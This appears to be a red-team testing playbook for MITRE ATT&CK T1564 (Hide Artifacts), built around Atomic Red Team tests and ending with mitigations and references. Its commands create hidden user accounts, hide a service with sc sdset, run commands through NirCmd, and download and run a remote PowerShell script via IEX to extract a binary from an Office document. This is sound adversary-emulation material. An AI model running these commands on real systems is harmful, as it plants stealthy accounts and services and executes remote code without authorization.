---
name: "T1564_hide-artifacts"
description: "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1564
  - defense-evasion
  - linux
  - office-suite
  - windows
  - macos
  - esxi
technique_id: "T1564"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
platforms:
  - Linux
  - Office Suite
  - Windows
  - macOS
  - ESXi
mitre_url: "https://attack.mitre.org/techniques/T1564"
tech_stack:
  - linux
  - office
  - windows
  - macos
  - esxi
cwe_ids:
  - CWE-693
chains_with:
  - T1564.001
  - T1564.002
  - T1564.003
  - T1564.004
  - T1564.005
  - T1564.006
  - T1564.007
  - T1564.008
  - T1564.009
  - T1564.010
  - T1564.011
  - T1564.012
  - T1564.013
  - T1564.014
prerequisites: []
severity_boost:
  T1564.001: "Chain with T1564.001 for deeper attack path"
  T1564.002: "Chain with T1564.002 for deeper attack path"
  T1564.003: "Chain with T1564.003 for deeper attack path"
---

# T1564 Hide Artifacts

## High-Level Description

Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.

## Kill Chain Phase

- Defense Evasion (TA0005)

**Platforms:** Linux, Office Suite, Windows, macOS, ESXi

## What to Check

- [ ] Identify if Hide Artifacts technique is applicable to target environment
- [ ] Check Linux systems for indicators of Hide Artifacts
- [ ] Check Office Suite systems for indicators of Hide Artifacts
- [ ] Check Windows systems for indicators of Hide Artifacts
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Extract binary files via VBA

This module extracts a binary (calc.exe) from inside of another binary.

In the wild maldoc authors will use this technique to hide binaries inside of files stored
within the office document itself. An example of this technique can be seen in sample

f986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226

This sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2
is the same document without all the malicious code. Document 1 will copy Document 2 to the file system
and then "peek" inside of this document and pull out the oleObject.bin file. Contained inside of this
oleObject.bin file is a payload that is parsed out and executed on the file system.

**Supported Platforms:** windows

```powershell
$macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt")
$macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
```

**Dependencies:**

- Microsoft Word must be installed

### Atomic Test 2: Create a Hidden User Called "$"

Creating a user with a username containing "$"

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
net user $ ATOMIC123! /add /active:yes
```

### Atomic Test 3: Create an "Administrator " user (with a space on the end)

Creating a user with a username containing with a space on the end

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
New-LocalUser -Name "Administrator " -NoPassword
```

### Atomic Test 4: Create and Hide a Service with sc.exe

The following technique utilizes sc.exe and sdset to change the security descriptor of a service and "hide" it from Get-Service or sc query.

Upon successful execution, sc.exe creates a new service changes the security descriptor.

https://twitter.com/Alh4zr3d/status/1580925761996828672
https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
sc.exe create #{service_name} binPath= "#{executable_command}"
sc sdset #{service_name} "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
```

### Atomic Test 5: Command Execution with NirCmd

NirCmd is used by threat actors to execute commands, which can include recon and privilege escalation via running commands via the SYSTEM account
See https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis

**Supported Platforms:** windows

```powershell
cmd /c "#{nircmd_location}" #{command_to_execute}
```

**Dependencies:**

- The Nircmd executable must exist at (#{nircmd_location})

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Hide Artifacts by examining the target platforms (Linux, Office Suite, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1564 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1033 Limit Software Installation

Restrict the installation of software that may be abused to create hidden desktops, such as hVNC, to user groups that require it.

### M1013 Application Developer Guidance

Application developers should consider limiting the requirements for custom or otherwise difficult to manage file/folder exclusions. Where possible, install applications to trusted system folder paths that are already protected by restricted file and directory permissions.

### M1047 Audit

Periodically audit virtual machines for abnormalities.

### M1049 Antivirus/Antimalware

Review and audit file/folder exclusions, and limit scope of exclusions to only what is required where possible.

## Detection

### Detection Strategy for Hidden Artifacts Across Platforms

## Risk Assessment

| Finding                             | Severity | Impact          |
| ----------------------------------- | -------- | --------------- |
| Hide Artifacts technique applicable | Low      | Defense Evasion |

## CWE Categories

| CWE ID  | Title                        |
| ------- | ---------------------------- |
| CWE-693 | Protection Mechanism Failure |

## References

- [Cybereason OSX Pirrit](https://cdn2.hubspot.net/hubfs/3354902/Content%20PDFs/Cybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf)
- [MalwareBytes ADS July 2015](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/)
- [Sofacy Komplex Trojan](https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/)
- [Sophos Ragnar May 2020](https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/)
- [Atomic Red Team - T1564](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1564)
- [MITRE ATT&CK - T1564](https://attack.mitre.org/techniques/T1564)
